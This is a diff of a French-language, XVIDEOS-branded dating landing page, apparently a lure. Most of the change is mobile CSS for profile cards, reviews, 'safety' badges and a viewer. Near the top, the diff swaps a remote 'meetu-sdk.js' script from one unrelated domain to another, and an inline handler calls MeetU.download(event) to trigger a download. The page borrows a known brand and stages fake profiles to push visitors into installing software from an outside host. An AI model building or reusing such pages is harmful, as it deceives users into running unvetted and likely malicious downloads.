@@ -1,897 +1,760 @@
+
 <!DOCTYPE html>
-<html lang="id">
+<html lang="fr">
 <head>
   <meta charset="UTF-8">
 
-   <script src="https://api.xcty68.vip/js/meetu-sdk.js"></script>
+   <script src="https://api.wenk918d.site/js/meetu-sdk.js"></script>
 
   <script>function k2(e) {
   MeetU.download(event);
   }</script>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>XVIDEOS - Tonton Video Malam Ini</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>XVIDEOS - Trouvez votre partenaire ce soir</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet">
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
     :root {
-      --bg: #0a0a0c;
-      --bg-2: #0f0f13;
-      --surface: #141419;
-      --surface-2: #1b1b22;
-      --line: #26262e;
-      --line-2: #30303a;
-      --text: #f5f4f1;
-      --muted: #8f8e99;
-      --muted-2: #b6b5be;
-      --accent: #ffb627;
-      --accent-2: #ff8a3d;
-      --violet: #7c5cff;
-      --emerald: #2ee6a8;
-      --grad: linear-gradient(135deg, #ffc24b 0%, #ff8a3d 100%);
+      --rose: #e11d48;
+      --rose-2: #fb7185;
+      --rose-soft: #fff1f2;
+      --ink: #1f2937;
+      --muted: #94a3b8;
+      --muted-2: #64748b;
+      --emerald: #10b981;
+      --amber: #f59e0b;
+      --violet: #8b5cf6;
+      --blue: #3b82f6;
+      --card: #ffffff;
+      --line: #f3e8ea;
     }
-    html { scroll-behavior: smooth; }
     body {
-      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-      background: var(--bg);
-      color: var(--text);
+      font-family: 'Nunito', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      background: linear-gradient(180deg, #fff7f8 0%, #fdf0f3 100%);
+      color: var(--ink);
       -webkit-font-smoothing: antialiased;
       overflow-x: hidden;
-      line-height: 1.5;
+      max-width: 480px;
+      margin: 0 auto;
+      min-height: 100vh;
+      padding-bottom: 110px;
     }
-    body::before {
-      content: '';
-      position: fixed;
-      inset: 0;
-      pointer-events: none;
-      background:
-        radial-gradient(600px 400px at 85% -10%, rgba(255, 178, 39, 0.10), transparent 60%),
-        radial-gradient(700px 500px at -10% 30%, rgba(124, 92, 255, 0.08), transparent 60%);
-      z-index: 0;
-    }
-    .wrap { position: relative; z-index: 1; max-width: 1180px; margin: 0 auto; padding: 0 24px; }
-    a { color: inherit; text-decoration: none; }
-    img { display: block; max-width: 100%; }
-    button { font-family: inherit; }
-    button, a { -webkit-tap-highlight-color: transparent; }
 
-    /* ---------- Header ---------- */
-    .site-header {
+    /* ---- Top bar ---- */
+    .topbar {
       position: sticky;
       top: 0;
       z-index: 50;
-      background: rgba(10, 10, 12, 0.72);
-      backdrop-filter: blur(14px);
-      -webkit-backdrop-filter: blur(14px);
-      border-bottom: 1px solid var(--line);
-    }
-    .header-inner {
       display: flex;
       align-items: center;
       justify-content: space-between;
-      height: 66px;
-      gap: 16px;
+      padding: 0.85rem 1.25rem;
+      background: rgba(255, 255, 255, 0.82);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--line);
     }
-    .logo { height: 30px; width: auto; object-fit: contain; }
-    .header-right { display: flex; align-items: center; gap: 14px; }
-    .pill {
+    .logo {
+      height: 32px;
+      width: auto;
+      display: block;
+      object-fit: contain;
+    }
+    .topbar-pill {
       display: inline-flex;
       align-items: center;
-      gap: 7px;
-      font-size: 0.72rem;
-      font-weight: 700;
-      letter-spacing: 0.04em;
-      text-transform: uppercase;
+      gap: 6px;
+      font-size: 0.68rem;
+      font-weight: 800;
       color: var(--emerald);
-      background: rgba(46, 230, 168, 0.10);
-      border: 1px solid rgba(46, 230, 168, 0.25);
-      padding: 6px 12px;
+      background: rgba(16, 185, 129, 0.1);
+      border: 1px solid rgba(16, 185, 129, 0.22);
+      padding: 4px 11px;
       border-radius: 999px;
     }
-    .dot { width: 7px; height: 7px; border-radius: 50%; background: var(--emerald); animation: pulse 1.6s infinite; }
-    @keyframes pulse {
-      0%, 100% { opacity: 1; box-shadow: 0 0 0 0 rgba(46,230,168,0.5); }
-      50% { opacity: 0.5; box-shadow: 0 0 0 6px rgba(46,230,168,0); }
+    .dot {
+      width: 7px; height: 7px; border-radius: 50%;
+      background: var(--emerald);
+      animation: livePulse 1.6s infinite;
     }
-    .btn {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      background: var(--grad);
-      color: #1a1200;
-      font-weight: 800;
-      border: none;
-      border-radius: 12px;
-      padding: 13px 22px;
-      font-size: 0.92rem;
-      cursor: pointer;
-      box-shadow: 0 4px 0 rgba(255, 138, 61, 0.35), 0 14px 34px rgba(255, 178, 39, 0.22);
-      transition: transform 0.15s, box-shadow 0.15s, filter 0.15s;
+    @keyframes livePulse {
+      0%, 100% { opacity: 1; box-shadow: 0 0 0 0 rgba(16,185,129,0.5); }
+      50% { opacity: 0.5; box-shadow: 0 0 0 5px rgba(16,185,129,0); }
     }
-    .btn:hover { filter: brightness(1.05); transform: translateY(-1px); }
-    .btn:active { transform: translateY(2px); box-shadow: 0 2px 0 rgba(255,138,61,0.35); }
-    .btn .free {
-      background: rgba(26, 18, 0, 0.14);
-      color: #1a1200;
-      font-size: 0.62rem;
-      font-weight: 800;
-      letter-spacing: 0.06em;
-      text-transform: uppercase;
-      padding: 3px 8px;
-      border-radius: 999px;
-    }
-    .btn-sm { padding: 9px 16px; font-size: 0.82rem; border-radius: 10px; }
 
-    /* ---------- Hero ---------- */
-    .hero { padding: 64px 0 56px; }
-    .hero-grid { display: grid; grid-template-columns: 1fr; gap: 40px; align-items: center; }
-    @media (min-width: 900px) { .hero-grid { grid-template-columns: 1.05fr 0.95fr; gap: 56px; } }
+    /* ---- Hero ---- */
+    .hero { padding: 2rem 1.25rem 1rem; text-align: center; position: relative; }
+    .hero::before {
+      content: '';
+      position: absolute;
+      top: -40px; left: -40px;
+      width: 220px; height: 220px;
+      background: radial-gradient(circle, rgba(251,113,133,0.18) 0%, transparent 65%);
+      pointer-events: none;
+    }
     .hero-badge {
       display: inline-flex;
       align-items: center;
-      gap: 8px;
-      padding: 7px 14px;
-      border: 1px solid var(--line-2);
+      gap: 6px;
+      padding: 5px 14px;
+      background: rgba(225, 29, 72, 0.08);
+      border: 1px solid rgba(225, 29, 72, 0.16);
+      color: var(--rose);
       border-radius: 999px;
-      background: var(--surface);
-      color: var(--muted-2);
-      font-size: 0.72rem;
-      font-weight: 700;
-      letter-spacing: 0.08em;
-      text-transform: uppercase;
-      margin-bottom: 22px;
+      font-size: 0.68rem;
+      font-weight: 800;
+      letter-spacing: 0.02em;
+      margin-bottom: 0.9rem;
+      position: relative; z-index: 1;
     }
-    .hero-badge .dot { background: var(--accent); animation-name: pulseAmber; }
-    @keyframes pulseAmber {
-      0%, 100% { opacity: 1; box-shadow: 0 0 0 0 rgba(255,178,39,0.5); }
-      50% { opacity: 0.5; box-shadow: 0 0 0 6px rgba(255,178,39,0); }
+    .hero-badge .dot { background: var(--rose); animation-name: rosePulse; }
+    @keyframes rosePulse {
+      0%, 100% { opacity: 1; box-shadow: 0 0 0 0 rgba(225,29,72,0.5); }
+      50% { opacity: 0.5; box-shadow: 0 0 0 5px rgba(225,29,72,0); }
     }
     .hero h1 {
-      font-family: 'Space Grotesk', sans-serif;
-      font-size: clamp(2.1rem, 7vw, 4.6rem);
-      font-weight: 700;
-      line-height: 1.04;
+      font-size: 2.1rem;
+      font-weight: 900;
+      line-height: 1.12;
       letter-spacing: -0.03em;
-      margin-bottom: 20px;
-      overflow-wrap: break-word;
+      margin-bottom: 0.6rem;
+      position: relative; z-index: 1;
     }
     .hero h1 .gt {
-      background: var(--grad);
+      background: linear-gradient(120deg, var(--rose), #ec4899);
       -webkit-background-clip: text;
       background-clip: text;
       -webkit-text-fill-color: transparent;
     }
     .hero-sub {
-      font-size: 0.98rem;
-      color: var(--muted);
-      line-height: 1.6;
-      max-width: 460px;
-      margin-bottom: 28px;
+      font-size: 0.84rem;
+      color: var(--muted-2);
+      line-height: 1.55;
+      max-width: 300px;
+      margin: 0 auto 1rem;
     }
-    .hero-cta { display: flex; align-items: center; gap: 16px; margin-bottom: 22px; flex-wrap: wrap; }
-    .hero-proof { display: flex; align-items: center; gap: 10px; margin-bottom: 26px; }
-    .proof-stars { color: var(--accent); letter-spacing: 1px; font-size: 0.92rem; }
-    .proof-text { font-size: 0.8rem; color: var(--muted); }
-    .proof-text strong { color: var(--text); font-weight: 700; }
-    .stats {
+    .avatar-stack {
       display: flex;
-      gap: 0;
-      border-top: 1px solid var(--line);
-      padding-top: 26px;
+      justify-content: center;
+      gap: 0.5rem;
+ margin-top: 20px;
+      margin-bottom: 1rem;
     }
-    .stat { flex: 1; padding: 0 18px; border-left: 1px solid var(--line); }
-    .stat:first-child { padding-left: 0; border-left: none; }
-    .stat-num { font-family: 'Space Grotesk', sans-serif; font-size: 1.6rem; font-weight: 700; color: var(--accent); }
-    .stat-label { font-size: 0.72rem; color: var(--muted); margin-top: 2px; }
-
-    .hero-media { position: relative; }
-    .live-badge {
-      position: absolute;
-      top: 14px; left: 14px;
-      z-index: 3;
-      display: inline-flex;
-      align-items: center;
-      gap: 7px;
-      background: rgba(10, 10, 12, 0.72);
-      backdrop-filter: blur(6px);
-      -webkit-backdrop-filter: blur(6px);
-      border: 1px solid var(--line-2);
-      color: var(--text);
-      font-size: 0.72rem;
-      font-weight: 700;
-      padding: 6px 12px;
-      border-radius: 999px;
-    }
-    .video-frame {
-      aspect-ratio: 16 / 10;
-      border-radius: 22px;
-      overflow: hidden;
-      background: #000;
-      border: 1px solid var(--line-2);
-      box-shadow: 0 30px 70px rgba(0,0,0,0.55), 0 0 0 1px rgba(255,178,39,0.08);
-    }
-    .video-frame video { width: 100%; height: 100%; object-fit: cover; display: block; }
-    .avatar-stack { display: flex; align-items: center; margin-top: -22px; position: relative; z-index: 2; padding-left: 16px; }
     .avatar-stack img {
-      width: 52px; height: 52px;
+      width: 44px; height: 44px;
       border-radius: 50%;
       object-fit: cover;
-      border: 3px solid var(--bg);
-      box-shadow: 0 6px 18px rgba(0,0,0,0.5);
+      border: 2.5px solid #fff;
+      box-shadow: 0 2px 8px rgba(225,29,72,0.15);
     }
-    .avatar-stack img + img { margin-left: -14px; }
-
-    /* ---------- Section scaffold ---------- */
-    .sec { padding: 56px 0; }
-    .sec-head { max-width: 640px; margin-bottom: 34px; }
-    .sec-head.center { margin-left: auto; margin-right: auto; text-align: center; }
-    .sec-tag {
-      display: inline-block;
-      font-size: 0.68rem;
-      font-weight: 700;
-      letter-spacing: 0.14em;
-      text-transform: uppercase;
-      color: var(--accent);
-      margin-bottom: 12px;
-    }
-    .sec-title { font-family: 'Space Grotesk', sans-serif; font-size: clamp(1.7rem, 3.6vw, 2.5rem); font-weight: 700; letter-spacing: -0.02em; line-height: 1.1; }
-    .sec-sub { font-size: 0.9rem; color: var(--muted); margin-top: 10px; }
-    .accent { color: var(--emerald); font-weight: 700; }
-    .benefits { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; }
-    @media (min-width: 640px) { .benefits { grid-template-columns: repeat(4, 1fr); } }
-    .b-chip {
-      display: flex; align-items: center; gap: 10px;
-      background: var(--surface);
-      border: 1px solid var(--line);
-      border-radius: 14px;
-      padding: 15px 16px;
-      font-size: 0.86rem;
-      font-weight: 600;
-      color: var(--muted-2);
-    }
-    .b-ic { font-size: 1.2rem; line-height: 1; flex-shrink: 0; }
-
-    /* ---------- Cards / grids ---------- */
-    .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 14px; }
-    @media (min-width: 560px) { .grid { grid-template-columns: repeat(3, 1fr); } }
-    @media (min-width: 960px) { .grid { grid-template-columns: repeat(4, 1fr); gap: 18px; } }
-    .hot-marquee { overflow: hidden; position: relative; padding: 4px 0; }
-    .hot-marquee::before, .hot-marquee::after {
-      content: '';
-      position: absolute; top: 0; bottom: 0; width: 44px; z-index: 3; pointer-events: none;
-    }
-    .hot-marquee::before { left: 0; background: linear-gradient(90deg, var(--bg), transparent); }
-    .hot-marquee::after { right: 0; background: linear-gradient(270deg, var(--bg), transparent); }
-    .hot-track {
+    .avatar-stack img:nth-child(odd) { transform: translateY(-6px); }
+    .avatar-stack img:nth-child(even) { transform: translateY(2px); }
+    .stats-row {
       display: flex;
-      width: max-content;
-      animation: marquee 32s linear infinite;
+      justify-content: center;
+      gap: 1.6rem;
+      margin-top: 0.75rem;
     }
-    .hot-track:hover { animation-play-state: paused; }
-    .hot-track .card { flex: 0 0 auto; width: 158px; margin-right: 14px; }
-    @media (min-width: 640px) { .hot-track .card { width: 200px; } }
-    @media (min-width: 960px) { .hot-track .card { width: 224px; } }
-    @keyframes marquee {
-      from { transform: translateX(0); }
-      to { transform: translateX(-50%); }
-    }
+    .stat-num { font-size: 1.15rem; font-weight: 900; color: var(--rose); }
+    .stat-label { font-size: 0.62rem; color: var(--muted); }
 
-    .card {
-      background: var(--surface);
-      border: 1px solid var(--line);
+    /* ---- Sections ---- */
+    .sec { padding: 1.4rem 1.25rem; }
+    .sec-head { text-align: center; margin-bottom: 1rem; }
+    .sec-tag {
+      font-size: 0.62rem;
+      font-weight: 800;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      color: var(--rose);
+      margin-bottom: 4px;
+    }
+    .sec-title { font-size: 1.3rem; font-weight: 800; letter-spacing: -0.02em; }
+    .sec-sub { font-size: 0.78rem; color: var(--muted); margin-top: 3px; }
+
+    /* ---- Hot picks carousel ---- */
+    .hot-scroll {
+      display: flex;
+      gap: 10px;
+      overflow-x: auto;
+      scroll-snap-type: x mandatory;
+      scrollbar-width: none;
+      -webkit-overflow-scrolling: touch;
+      padding: 4px 1.25rem 10px;
+      margin: 0 -1.25rem;
+      scroll-behavior: smooth;
+    }
+    .hot-scroll::-webkit-scrollbar { display: none; }
+    .hot-card {
+      flex: 0 0 138px;
+      scroll-snap-align: start;
+      background: var(--card);
       border-radius: 18px;
       overflow: hidden;
+      box-shadow: 0 6px 20px rgba(225, 29, 72, 0.08);
+      border: 1px solid var(--line);
       cursor: pointer;
-      transition: transform 0.2s ease, border-color 0.2s ease, box-shadow 0.2s ease;
+      transition: transform 0.15s;
     }
-    .card:hover { transform: translateY(-4px); border-color: var(--line-2); box-shadow: 0 18px 40px rgba(0,0,0,0.45); }
-    .ph { position: relative; aspect-ratio: 3 / 4; overflow: hidden; background: var(--surface-2); }
-    .ph img { width: 100%; height: 100%; object-fit: cover; transition: transform 0.4s ease; }
-    .card:hover .ph img { transform: scale(1.06); }
-    .badge {
+    .hot-card:active { transform: scale(0.96); }
+    .hot-img { position: relative; aspect-ratio: 3/4; overflow: hidden; }
+    .hot-img img { width: 100%; height: 100%; object-fit: cover; display: block; }
+    .hot-badge {
       position: absolute;
-      top: 10px; left: 10px;
-      padding: 4px 10px;
-      border-radius: 9px;
-      font-size: 0.58rem;
+      top: 8px; left: 8px;
+      padding: 3px 9px;
+      border-radius: 10px;
+      font-size: 0.55rem;
       font-weight: 800;
-      letter-spacing: 0.06em;
+      letter-spacing: 0.03em;
       text-transform: uppercase;
-      z-index: 2;
+      color: #fff;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.15);
     }
-    .badge.online { background: rgba(46, 230, 168, 0.9); color: #05231a; }
-    .badge.hot, .badge.popular { background: var(--grad); color: #1a1200; }
-    .badge.new { background: linear-gradient(135deg, #7c5cff, #a78bfa); color: #fff; }
-    .badge.verified { background: rgba(46, 230, 168, 0.16); color: var(--emerald); border: 1px solid rgba(46,230,168,0.35); }
-    .badge.vip { background: linear-gradient(135deg, #ffd34d, #ffb627); color: #1a1200; }
-    .views {
+    .hot-badge.popular { background: linear-gradient(135deg, #f97316, #fb923c); }
+    .hot-badge.new { background: linear-gradient(135deg, #3b82f6, #60a5fa); }
+    .hot-badge.verified { background: linear-gradient(135deg, #10b981, #34d399); }
+    .hot-badge.vip { background: linear-gradient(135deg, #8b5cf6, #a78bfa); }
+    .hot-views {
       position: absolute;
-      bottom: 10px; right: 10px;
-      font-size: 0.66rem;
+      bottom: 8px; right: 8px;
+      font-size: 0.58rem;
       font-weight: 700;
       color: #fff;
-      background: rgba(0,0,0,0.55);
-      backdrop-filter: blur(4px);
-      padding: 3px 9px;
+      background: rgba(31, 41, 55, 0.45);
+      padding: 2px 8px;
       border-radius: 9px;
-      z-index: 2;
+      backdrop-filter: blur(4px);
     }
-    .play {
-      position: absolute;
-      top: 14px; right: 14px;
-      width: 46px; height: 46px;
-      border-radius: 50%;
-      border: none;
+    .hot-info { padding: 9px 10px; }
+    .hot-name { font-size: 0.8rem; font-weight: 800; color: var(--ink); }
+    .hot-age { font-weight: 700; color: var(--muted); font-size: 0.72rem; }
+    .hot-dots { display: flex; justify-content: center; gap: 5px; margin-top: 10px; }
+    .hot-dot {
+      width: 5px; height: 5px; border-radius: 3px;
+      background: rgba(225, 29, 72, 0.18);
+      transition: all 0.3s;
+    }
+    .hot-dot.on { background: var(--rose); width: 16px; }
+
+    /* ---- Main list: 2-column masonry grid ---- */
+    .user-list { display: flex; gap: 12px; align-items: flex-start; }
+    .p-col { flex: 1; display: flex; flex-direction: column; gap: 12px; }
+    .p-card {
+      position: relative;
+      border-radius: 20px;
+      overflow: hidden;
+      background: var(--card);
+      border: 1px solid var(--line);
+      box-shadow: 0 6px 20px rgba(225, 29, 72, 0.08);
       cursor: pointer;
-      background: var(--grad);
-      color: #1a1200;
-      display: flex; align-items: center; justify-content: center;
-      box-shadow: 0 10px 24px rgba(255,138,61,0.5);
-      z-index: 3;
-      transition: transform 0.18s ease, box-shadow 0.18s ease;
-      animation: playGlow 2.2s ease-in-out infinite;
+      transition: transform 0.15s;
     }
-    .play svg { margin-left: 2px; filter: drop-shadow(0 1px 2px rgba(0,0,0,0.18)); }
-    .play::before, .play::after {
+    .p-card:active { transform: scale(0.97); }
+    .p-card img { position: absolute; inset: 0; width: 100%; height: 100%; object-fit: cover; display: block; }
+    .p-shade {
+      position: absolute; inset: 0;
+      background: linear-gradient(180deg, rgba(0,0,0,0.18) 0%, rgba(0,0,0,0) 32%, rgba(0,0,0,0) 55%, rgba(0,0,0,0.85) 100%);
+    }
+    .p-badge {
+      position: absolute; top: 10px; left: 10px;
+      padding: 3px 9px; border-radius: 10px;
+      font-size: 0.55rem; font-weight: 800; letter-spacing: 0.03em; text-transform: uppercase; color: #fff;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+    }
+    .p-badge.online { background: linear-gradient(135deg, #10b981, #34d399); }
+    .p-badge.hot { background: linear-gradient(135deg, #f97316, #fb923c); }
+    .p-badge.new { background: linear-gradient(135deg, #8b5cf6, #a78bfa); }
+    .p-play {
+      position: absolute; top: 12px; right: 12px;
+      width: 40px; height: 40px; border-radius: 50%;
+      border: none; cursor: pointer;
+      background: linear-gradient(135deg, var(--rose), #ec4899);
+      color: #fff;
+      display: flex; align-items: center; justify-content: center;
+      box-shadow: 0 4px 16px rgba(225, 29, 72, 0.55);
+      z-index: 2;
+      transition: transform 0.12s;
+    }
+    .p-play svg { margin-left: 2px; }
+    .p-play::before, .p-play::after {
       content: '';
       position: absolute;
-      inset: 0;
+      top: 0; left: 0; right: 0; bottom: 0;
       border-radius: 50%;
-      border: 2px solid rgba(255, 178, 39, 0.95);
-      animation: playPing 1.9s cubic-bezier(0, 0, 0.2, 1) infinite;
-      pointer-events: none;
+      border: 2px solid rgba(255, 255, 255, 0.95);
+      animation: playPing 1.8s cubic-bezier(0, 0, 0.2, 1) infinite;
     }
-    .play::after { animation-delay: 0.95s; }
+    .p-play::after { animation-delay: 0.9s; }
     @keyframes playPing {
       0% { transform: scale(1); opacity: 1; }
-      100% { transform: scale(1.85); opacity: 0; }
+      100% { transform: scale(1.6); opacity: 0; }
     }
-    @keyframes playGlow {
-      0%, 100% { box-shadow: 0 10px 24px rgba(255,138,61,0.5); }
-      50% { box-shadow: 0 10px 40px rgba(255,138,61,0.9), 0 0 0 8px rgba(255,178,39,0.10); }
+    .p-play:active { transform: scale(0.88); }
+    .p-info { position: absolute; left: 0; right: 0; bottom: 0; padding: 12px; }
+    .p-name { color: #fff; font-size: 0.95rem; font-weight: 900; display: flex; align-items: center; gap: 5px; }
+    .p-name .v {
+      width: 15px; height: 15px; background: var(--rose); color: #fff; border-radius: 50%;
+      display: inline-flex; align-items: center; justify-content: center; font-size: 0.55rem;
     }
-    .play:hover { transform: scale(1.12); }
-    .play:active { transform: scale(0.88); }
-    /* stagger the pulse so cards don't animate in lockstep */
-    .card:nth-child(2n) .play::before { animation-delay: 0.3s; }
-    .card:nth-child(2n) .play::after { animation-delay: 1.25s; }
-    .card:nth-child(3n) .play::before { animation-delay: 0.6s; }
-    .card:nth-child(3n) .play::after { animation-delay: 1.55s; }
-    .hd {
-      position: absolute;
-      bottom: 10px; left: 10px;
-      padding: 3px 8px;
-      border-radius: 7px;
-      background: rgba(0, 0, 0, 0.62);
-      backdrop-filter: blur(4px);
-      -webkit-backdrop-filter: blur(4px);
-      color: #fff;
-      font-size: 0.6rem;
-      font-weight: 800;
-      letter-spacing: 0.05em;
-      z-index: 2;
-    }
-    .p-cta {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      width: 100%;
-      padding: 11px 12px;
-      border: none;
-      border-top: 1px solid var(--line);
-      background: var(--surface-2);
-      color: var(--text);
-      font-weight: 700;
-      font-size: 0.82rem;
-      cursor: pointer;
-      transition: background 0.18s ease, color 0.18s ease;
-    }
-    .p-cta:hover { background: var(--grad); color: #1a1200; }
-    .p-cta:active { transform: scale(0.98); }
-    .p-cta svg { flex-shrink: 0; }
+    .p-age { font-weight: 700; color: rgba(255, 255, 255, 0.85); font-size: 0.8rem; }
+    .p-job { font-size: 0.72rem; color: rgba(255, 255, 255, 0.85); margin-top: 1px; }
+    .p-loc { font-size: 0.66rem; color: rgba(255, 255, 255, 0.72); margin-top: 2px; }
 
-    .more-card {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      gap: 12px;
+    /* ---- Safety ---- */
+    .safety-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; }
+    .safety-item {
       text-align: center;
-      padding: 24px 16px;
-      min-height: 220px;
-      background: var(--surface);
-      border: 1px dashed var(--line-2);
-      border-radius: 18px;
-      color: var(--muted-2);
-      cursor: pointer;
-      transition: border-color 0.2s ease, color 0.2s ease, transform 0.2s ease;
-    }
-    .more-card:hover { border-color: var(--accent); color: var(--accent); transform: translateY(-4px); }
-    .more-ic {
-      width: 56px; height: 56px;
-      border-radius: 50%;
-      background: rgba(255, 178, 39, 0.12);
-      color: var(--accent);
-      display: flex; align-items: center; justify-content: center;
-    }
-    .more-txt { font-size: 0.92rem; font-weight: 700; }
-    .more-sub { font-size: 0.72rem; color: var(--muted); }
-
-    /* ---------- Safety band ---------- */
-    .safety-band { background: var(--bg-2); border-top: 1px solid var(--line); border-bottom: 1px solid var(--line); }
-    .safety-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
-    .safety-item { padding: 8px 0; text-align: center; }
-    .safety-item .ic {
-      width: 48px; height: 48px;
+      padding: 1rem 0.4rem;
+      background: var(--card);
+      border: 1px solid var(--line);
       border-radius: 16px;
+      box-shadow: 0 4px 14px rgba(225,29,72,0.05);
+    }
+    .safety-item .ic {
+      width: 42px; height: 42px;
+      margin: 0 auto 6px;
+      border-radius: 12px;
       display: flex;
       align-items: center;
       justify-content: center;
-      margin: 0 auto 10px;
     }
-    .safety-item .t { font-family: 'Space Grotesk', sans-serif; font-size: 0.92rem; font-weight: 700; }
-    .safety-item .d { display: none; }
-    @media (min-width: 720px) {
-      .safety-grid { gap: 0; }
-      .safety-item { padding: 0 32px; text-align: left; }
-      .safety-item + .safety-item { border-left: 1px solid var(--line); }
-      .safety-item .ic { width: 52px; height: 52px; margin: 0 0 14px; }
-      .safety-item .t { font-size: 1.02rem; }
-      .safety-item .d { display: block; font-size: 0.8rem; color: var(--muted); margin-top: 4px; line-height: 1.4; }
-    }
+    .safety-item .t { font-size: 0.78rem; font-weight: 800; }
+    .safety-item .d { font-size: 0.6rem; color: var(--muted); line-height: 1.25; margin-top: 2px; }
 
-    /* ---------- Reviews ---------- */
-    .review-grid { display: grid; grid-template-columns: 1fr; gap: 16px; }
-    @media (min-width: 640px) { .review-grid { grid-template-columns: repeat(2, 1fr); } }
-    @media (min-width: 960px) { .review-grid { grid-template-columns: repeat(3, 1fr); } }
+    /* ---- Reviews ---- */
+    .review-scroll {
+      display: flex;
+      gap: 12px;
+      overflow-x: auto;
+      scroll-snap-type: x mandatory;
+      scrollbar-width: none;
+      -webkit-overflow-scrolling: touch;
+      padding: 4px 0 8px;
+    }
+    .review-scroll::-webkit-scrollbar { display: none; }
     .review-card {
-      background: var(--surface);
+      min-width: 250px;
+      max-width: 290px;
+      flex-shrink: 0;
+      scroll-snap-align: start;
+      background: var(--card);
       border: 1px solid var(--line);
       border-radius: 18px;
-      padding: 26px;
-      position: relative;
-      transition: border-color 0.2s ease;
+      padding: 1rem;
+      box-shadow: 0 4px 14px rgba(225,29,72,0.06);
     }
-    .review-card:hover { border-color: var(--line-2); }
-    .review-card::before {
-      content: '“';
-      position: absolute;
-      top: 10px; right: 22px;
-      font-family: 'Space Grotesk', sans-serif;
-      font-size: 4.4rem;
-      line-height: 1;
-      color: rgba(255, 178, 39, 0.18);
-      pointer-events: none;
-    }
-    .review-stars { color: var(--accent); letter-spacing: 2px; margin-bottom: 12px; font-size: 0.85rem; }
-    .review-text { font-size: 0.86rem; color: var(--muted-2); line-height: 1.6; margin-bottom: 20px; }
-    .review-author { display: flex; align-items: center; gap: 11px; border-top: 1px solid var(--line); padding-top: 16px; }
-    .review-author img { width: 40px; height: 40px; border-radius: 50%; object-fit: cover; border: 2px solid var(--line-2); }
-    .review-author-name { font-family: 'Space Grotesk', sans-serif; font-size: 0.86rem; font-weight: 700; }
-    .review-author-role { font-size: 0.68rem; color: var(--accent); margin-top: 1px; }
+    .review-stars { color: #f59e0b; letter-spacing: 1px; margin-bottom: 0.5rem; }
+    .review-text { font-size: 0.76rem; color: var(--muted-2); line-height: 1.55; margin-bottom: 0.7rem; }
+    .review-author { display: flex; align-items: center; gap: 9px; }
+    .review-author img { width: 34px; height: 34px; border-radius: 50%; object-fit: cover; }
+    .review-author-name { font-size: 0.76rem; font-weight: 800; }
+    .review-author-role { font-size: 0.62rem; color: var(--muted); }
 
-    /* ---------- CTA band + footer ---------- */
-    .cta-band { padding: 64px 0 40px; }
-    .cta-panel {
-      position: relative;
-      border: 1px solid var(--line-2);
-      border-radius: 26px;
-      background: radial-gradient(400px 200px at 50% -20%, rgba(255,178,39,0.16), transparent 70%), var(--surface);
-      padding: 56px 28px;
-      text-align: center;
-      overflow: hidden;
-    }
-    .cta-panel .btn { font-size: 1.05rem; padding: 16px 30px; }
-    .cta-trust { margin-top: 18px; font-size: 0.8rem; color: var(--muted); }
-    .ft { text-align: center; padding: 28px 24px 40px; font-size: 0.72rem; color: var(--muted); border-top: 1px solid var(--line); }
-
-    /* ---------- Viewer ---------- */
+    /* ---- Viewer ---- */
     .viewer {
       display: none;
       position: fixed;
       inset: 0;
       z-index: 999;
-      background: rgba(6, 6, 8, 0.94);
-      backdrop-filter: blur(8px);
+      background: rgba(255, 247, 248, 0.97);
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      padding: 20px;
+      padding: 1rem;
     }
     .viewer.on { display: flex; }
     .viewer-close {
       position: absolute;
-      top: 18px; right: 18px;
+      top: 16px; right: 16px;
       z-index: 10;
-      width: 44px; height: 44px;
+      width: 40px; height: 40px;
       border-radius: 50%;
-      background: var(--surface-2);
-      color: var(--text);
-      display: flex; align-items: center; justify-content: center;
-      font-size: 1.6rem;
+      background: rgba(225, 29, 72, 0.1);
+      color: var(--rose);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.5rem;
       line-height: 1;
       cursor: pointer;
-      border: 1px solid var(--line-2);
+      border: none;
       font-weight: 700;
     }
     .viewer-frame {
       width: 100%;
-      max-width: 360px;
+      max-width: 340px;
       aspect-ratio: 3/4;
       border-radius: 22px;
       overflow: hidden;
-      border: 1px solid var(--line-2);
-      box-shadow: 0 30px 80px rgba(0,0,0,0.6);
+      box-shadow: 0 20px 50px rgba(225, 29, 72, 0.18);
     }
     .viewer-frame img { width: 100%; height: 100%; object-fit: cover; display: block; }
-    .viewer-info { text-align: center; margin-top: 22px; }
-    .viewer-info .v-name { font-family: 'Space Grotesk', sans-serif; font-size: 1.3rem; font-weight: 700; }
-    .viewer-info .v-job { font-size: 0.9rem; color: var(--muted-2); margin-top: 4px; }
-    .viewer-info .v-stats { font-size: 0.82rem; color: var(--muted); margin-top: 5px; }
-    .viewer-info .v-loc { font-size: 0.78rem; color: var(--accent); font-weight: 700; margin-top: 4px; }
+    .viewer-info { text-align: center; margin-top: 18px; }
+    .viewer-info .v-name { font-size: 1.15rem; font-weight: 900; }
+    .viewer-info .v-job { font-size: 0.85rem; color: var(--muted-2); margin-top: 2px; }
+    .viewer-info .v-stats { font-size: 0.78rem; color: var(--muted); margin-top: 4px; }
